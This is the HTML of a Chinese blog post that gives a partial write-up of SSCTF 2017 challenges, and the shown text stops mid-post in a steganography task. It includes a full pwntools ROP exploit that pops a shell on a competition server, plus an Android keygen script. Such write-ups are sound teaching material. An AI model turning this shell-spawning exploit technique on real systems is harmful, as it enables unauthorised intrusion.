@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>SSCTF-2017部分Writeup | o0xmuhe&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00刚结束的SSCTF2017，自己只做了一点。">
+<meta name="keywords" content="ctf,ctf writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSCTF-2017部分Writeup">
+<meta property="og:url" content="http://o0xmuhe.me/2017/05/08/SSCTF-2017部分Writeup/index.html">
+<meta property="og:site_name" content="o0xmuhe&#39;s blog">
+<meta property="og:description" content="0x00刚结束的SSCTF2017，自己只做了一点。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/compare.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/apk1.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/apk2.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-0.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-1.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-2.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-3.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-4.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-5.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-6.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-7.png">
+<meta property="og:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-8.png">
+<meta property="og:updated_time" content="2017-05-08T07:17:00.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSCTF-2017部分Writeup">
+<meta name="twitter:description" content="0x00刚结束的SSCTF2017，自己只做了一点。">
+<meta name="twitter:image" content="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/compare.png">
+  
+    <link rel="alternative" href="/atom.xml" title="o0xmuhe&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">muhe</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">一个有情怀的二进制狗</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/tags">标签</a></li>
+                        
+                            <li><a href="/about">关于我</a></li>
+                        
+                            <li><a href="/Pwnable-Log">Pwnable</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/o0xmuhe" title="github">github</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/2070174943/" title="weibo">weibo</a>
+                            
+                                <a class="fl twitter" target="_blank" href="https://twitter.com/0xmuhe" title="twitter">twitter</a>
+                            
+                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Antlr/" style="font-size: 10px;">Antlr</a> <a href="/tags/C/" style="font-size: 11.67px;">C</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CTF-Writeup/" style="font-size: 10px;">CTF Writeup</a> <a href="/tags/Compilers/" style="font-size: 10px;">Compilers</a> <a href="/tags/LLVM/" style="font-size: 10px;">LLVM</a> <a href="/tags/Linux/" style="font-size: 11.67px;">Linux</a> <a href="/tags/PANDA/" style="font-size: 10px;">PANDA</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Study/" style="font-size: 16.67px;">Study</a> <a href="/tags/Symbolic-Execution/" style="font-size: 10px;">Symbolic Execution</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/angr/" style="font-size: 11.67px;">angr</a> <a href="/tags/compiler/" style="font-size: 10px;">compiler</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/ctf-writeup/" style="font-size: 20px;">ctf writeup</a> <a href="/tags/debug/" style="font-size: 10px;">debug</a> <a href="/tags/env-config/" style="font-size: 10px;">env config</a> <a href="/tags/exploit/" style="font-size: 16.67px;">exploit</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/glibc内存管理/" style="font-size: 10px;">glibc内存管理</a> <a href="/tags/life/" style="font-size: 11.67px;">life</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/linux-kernel/" style="font-size: 13.33px;">linux kernel</a> <a href="/tags/mips/" style="font-size: 10px;">mips</a> <a href="/tags/paper/" style="font-size: 10px;">paper</a> <a href="/tags/peach/" style="font-size: 10px;">peach</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/ret-2-dl-resolve/" style="font-size: 10px;">ret 2 dl-resolve</a> <a href="/tags/study/" style="font-size: 13.33px;">study</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/uaf/" style="font-size: 10px;">uaf</a> <a href="/tags/unicorn-engine/" style="font-size: 10px;">unicorn engine</a> <a href="/tags/vuln-analysis/" style="font-size: 10px;">vuln analysis</a> <a href="/tags/wargame/" style="font-size: 11.67px;">wargame</a> <a href="/tags/winafl/" style="font-size: 10px;">winafl</a> <a href="/tags/windows-kernel/" style="font-size: 13.33px;">windows kernel</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/感悟/" style="font-size: 10px;">感悟</a> <a href="/tags/环境配置/" style="font-size: 10px;">环境配置</a> <a href="/tags/编译原理/" style="font-size: 11.67px;">编译原理</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://syclover.sinaapp.com/">Syclover Team</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://weibo.com/u/5376172367">最爱的高老师</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.Ox9A82.com">0x9A82学弟</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://k1n9.me/">K1n9师傅</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy">L3mon</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.xianyusec.com">咸鱼</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://rootclay.com">rootclay</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://v1ct0r.com/">V1ct0r</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://godot.win">Godot学弟</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hebic.me/">Homaebic学弟</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://iqwq.me">两米的sco4x0</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://zmy.im/">JimmyZhou</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://silic.top/">灭亡叔叔</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://dwx.io">Jason</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="	http://www.0aa.me/">Mosuan</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://whereisk0shl.top">k0sh1</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://winter3un.github.io">WinterSun</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://venenof.com">Venenof</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://r0p.me/">Icemakr</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://bestwing.me/">Swing</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.hackersb.cn/">王松_Striker</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/7top/">7top</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.bendawang.site">bendawang</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://yixuankeer.win">前端joker大佬</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.lc4t.me">lc4t</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.inksec.cn/">Szrzvdny</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://sixwha1e.github.io/">漂亮的sixwhale小姐姐</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://ctfrank.org">CTF Rank</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://askook.me/">A酱</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">关注二进制安全. Member of Syclover. CTFer/INTJ.</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">muhe</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">muhe</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">一个有情怀的二进制狗</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/tags">标签</a></li>
+                
+                    <li><a href="/about">关于我</a></li>
+                
+                    <li><a href="/Pwnable-Log">Pwnable</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/o0xmuhe" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/2070174943/" title="weibo">weibo</a>
+                    
+                        <a class="twitter" target="_blank" href="https://twitter.com/0xmuhe" title="twitter">twitter</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-SSCTF-2017部分Writeup" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/05/08/SSCTF-2017部分Writeup/" class="article-date">
+      <time datetime="2017-05-08T07:15:12.000Z" itemprop="datePublished">2017-05-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SSCTF-2017部分Writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-writeup/">ctf writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>刚结束的SSCTF2017，自己只做了一点。</p>
+<a id="more"></a>
+<h4 id="Pwn250"><a href="#Pwn250" class="headerlink" title="Pwn250"></a>Pwn250</h4><p>栈溢出，简单粗暴，但是程序是静态链接的，又有NX保护，直接ROP就好了。</p>
+<p>思路就是，在.bss上构造参数，然后使用int 0x80起shell。</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x0804887C</span></span><br><span class="line"></span><br><span class="line">int80_gad_addr = <span class="number">0x0806cbb5</span></span><br><span class="line"><span class="comment">#0x3a+4+4</span></span><br><span class="line">read_addr = <span class="number">0x0806D510</span></span><br><span class="line">write_addr= <span class="number">0x0806D580</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x080ECA35</span></span><br><span class="line"></span><br><span class="line">xor_eax_eax_ret = <span class="number">0x080493a3</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080df1b9</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806efbb</span></span><br><span class="line">add_al_ret = <span class="number">0x080b4f19</span></span><br><span class="line">mov_esp_ecx = <span class="number">0x080b8c22</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">'./250'</span>)<span class="comment">#,env=env)</span></span><br><span class="line">    <span class="comment">#p = process('filename',raw=False)</span></span><br><span class="line">    <span class="comment">#this for Windows10 subsystem</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'60.191.205.81'</span>,<span class="number">2017</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Size]'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data]'</span>)</span><br><span class="line">    p.sendline(str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    gdb.attach(p,"""</span></span><br><span class="line"><span class="string">        b *0x08048986</span></span><br><span class="line"><span class="string">        c</span></span><br><span class="line"><span class="string">    """)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    payload = <span class="string">'A'</span>*(<span class="number">0x3a</span>+<span class="number">4</span>) +p32(read_addr) + p32(main_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">    fuck(<span class="number">0x100</span>,payload)</span><br><span class="line">    p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">'A'</span>*(<span class="number">0x3a</span>+<span class="number">4</span>) +p32(read_addr) + p32(main_addr) + p32(<span class="number">0</span>) + p32(bss_addr+<span class="number">10</span>) + p32(<span class="number">8</span>)</span><br><span class="line">    fuck(<span class="number">0x100</span>,payload)</span><br><span class="line">    p.send(p32(bss_addr))</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'A'</span>*(<span class="number">0x3a</span>+<span class="number">4</span>) + p32(xor_eax_eax_ret)+p32(pop_ebx_ret)+p32(bss_addr)</span><br><span class="line">    payload += p32(pop_ecx_ret) + p32(bss_addr+<span class="number">10</span>)</span><br><span class="line">    payload += p32(pop_edx_ret) + p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(add_al_ret) * <span class="number">0xb</span></span><br><span class="line">    payload += p32(int80_gad_addr) </span><br><span class="line">    fuck(<span class="number">0x100</span>,payload)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h4 id="apk1"><a href="#apk1" class="headerlink" title="apk1"></a>apk1</h4><p>程序会加密<code>ctf1.xlsx</code>，加密是每隔0x100字符加密一次。</p>
+<p>加密的大概逻辑是：</p>
+<ol>
+<li>先调用验证函数<code>private boolean verify(String arg11, String arg12)</code>，会根据签名算出一个k1[40]</li>
+<li>根据输入的6位数字，和k1操作后得到新的k1</li>
+<li>进入加密逻辑，使用新的k1与xlsx的每隔0x100的字符，循环亦或。</li>
+</ol>
+<p>思路就是，反向先推一点，可以根据加密后的xlsx和正常的比对，能得到k1的前三个字节。</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/compare.png" alt=""></p>
+<p>然后我把java代码复制出来新建一个java的工程，去爆破6位数字：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6位数字 ---&gt; 和k1生成新的k1 ---&gt; 然后比对前三字节</span><br></pre></td></tr></table></figure>
+<p>然后使用<code>private boolean encode(Context arg12)</code>，把加密前后的文件名换一下，就可以直接解出来。</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/apk1.png" alt=""></p>
+<h4 id="apk2-login"><a href="#apk2-login" class="headerlink" title="apk2 login"></a>apk2 login</h4><p>主要的函数在native层。把输入的12字节扩展为16字节，然后到java层去验证，正确的话经过AES解密弹出flag。</p>
+<p>经过分析，只要使得输入的12字节经过变换后，等于 <code>01635e6c5f2378255f27356c11663165</code> 就好了。</p>
+<p>主要的算法是，把输入的12字节分成4组，每组3个字节，每组的变化规律是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">L[flag[0] &gt;&gt; 2] = res[0] ^ 0x3F</span><br><span class="line">L[flag[1] &gt;&gt;4 + flag[0]&lt;&lt;4 &amp; 0x3f] = res[1] ^0xf</span><br><span class="line">L[flag[1]&lt;&lt;2&amp;0x3f + flag[2] &gt;&gt;6] = res[2]</span><br><span class="line">L[flag[2] &amp;0x3f] = res[3]</span><br></pre></td></tr></table></figure>
+<p>写脚本做还原操作就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">res = [<span class="number">0x01</span>,<span class="number">0x63</span>,<span class="number">0x5e</span>,<span class="number">0x6c</span>,</span><br><span class="line">4   <span class="number">0x5f</span>,<span class="number">0x23</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,</span><br><span class="line">4   <span class="number">0x5f</span>,<span class="number">0x27</span>,<span class="number">0x35</span>,<span class="number">0x6c</span>,</span><br><span class="line">4   <span class="number">0x11</span>,<span class="number">0x66</span>,<span class="number">0x31</span>,<span class="number">0x65</span>]</span><br><span class="line"></span><br><span class="line">final = [<span class="number">0x21</span>, <span class="number">0x3A</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2B</span>,</span><br><span class="line">44<span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x60</span>, <span class="number">0x7E</span>, <span class="number">0x5F</span>, <span class="number">0x5B</span>, <span class="number">0x5D</span>, <span class="number">0x7B</span>,</span><br><span class="line">44<span class="number">0x7D</span>, <span class="number">0x3F</span>, <span class="number">0x3C</span>, <span class="number">0x3E</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x40</span>, <span class="number">0x5E</span>, <span class="number">0x61</span>,</span><br><span class="line">44<span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>,</span><br><span class="line">44<span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>,</span><br><span class="line">44<span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x30</span>, <span class="number">0x31</span>,</span><br><span class="line"> 		<span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x5C</span>,</span><br><span class="line">44<span class="number">0x27</span>, <span class="number">0x3B</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">L[flag[0] &gt;&gt; 2] = res[0] ^ 0x3F</span></span><br><span class="line"><span class="string">L[flag[1] &gt;&gt;4 + flag[0]&lt;&lt;4 &amp; 0x3f] = res[1] ^0xf</span></span><br><span class="line"><span class="string">L[flag[1]&lt;&lt;2&amp;0x3f + flag[2] &gt;&gt;6] = res[2]</span></span><br><span class="line"><span class="string">L[flag[2] &amp;0x3f] = res[3]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span><span class="params">(target)</span>:</span></span><br><span class="line">4<span class="keyword">return</span> final.index(target)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">()</span>:</span></span><br><span class="line">4flag = []</span><br><span class="line">4<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(res),<span class="number">4</span>):</span><br><span class="line">44ch0 = ((get_index(res[i] ^ <span class="number">0x3f</span>) &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span>)+(get_index(res[i+<span class="number">1</span>] ^ <span class="number">0xf</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">44flag.append(ch0)</span><br><span class="line">44ch1 = ((get_index(res[i+<span class="number">1</span>] ^ <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) + (get_index(res[i+<span class="number">2</span>]) &gt;&gt; <span class="number">2</span>)</span><br><span class="line">44flag.append(ch1)</span><br><span class="line">44ch2 = ((get_index(res[i+<span class="number">2</span>]) &lt;&lt; <span class="number">6</span> ) &amp; <span class="number">0xff</span>) + get_index(res[i+<span class="number">3</span>])</span><br><span class="line">44flag.append(ch2)</span><br><span class="line">4<span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> fuck():</span><br><span class="line">4out += chr(ch)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> out</span><br><span class="line"><span class="comment">#VVe1lD0ne^-^</span></span><br></pre></td></tr></table></figure>
+<p>安装apk到手机上，然后输入得到的字符串，得到flag</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/apk2.png" alt=""></p>
+<h4 id="Music-300-你知道我在等你吗"><a href="#Music-300-你知道我在等你吗" class="headerlink" title="Music 300 你知道我在等你吗"></a>Music 300 你知道我在等你吗</h4><p>拿到一个mp3，先binwalk看了一下：</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-0.png" alt=""></p>
+<p>zip啊，手动修改文件后缀为zip，然后直接解压得到如下：</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-1.png" alt=""></p>
+<p>二维码并没有什么卵用…coffee是加密的zip，把mp3丢进010 editor，发现后面多了一部分数据，strings之后得到一个有点奇怪的字符串：</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-2.png" alt=""></p>
+<p>尝试使用它解密zip…居然可以 :)</p>
+<p>解开之后有个coffee.jpg</p>
+<p>惯例使用binwalk扫一下：</p>
+<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-3.png" alt=""></p>
+<p>并没有什么特别的地方。</p>
